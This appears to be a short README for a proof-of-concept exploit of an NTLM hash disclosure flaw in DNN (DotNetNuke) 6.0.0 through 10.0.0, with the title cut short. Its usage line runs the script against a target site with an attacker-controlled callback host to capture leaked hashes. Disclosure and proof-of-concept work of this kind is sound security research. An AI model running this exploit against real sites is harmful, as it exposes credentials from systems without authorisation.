# DNN (DotNetNuke) - Unicode Path Normalization NTLM Hash Disclosu

- DNN (formerly DotNetNuke) is an open-source web content management platform (CMS) in the Microsoft ecosystem. In versions 6.0.0 to before 10.0.1, DNN.PLATFORM allows a specially crafted series of malicious interaction to potentially expose NTLM hashes to a third party SMB server. This issue has been patched in version 10.0.1.


To use:
```bash
python3 poc.py https://target-site.com your-interactsh-url.oastify.com
```
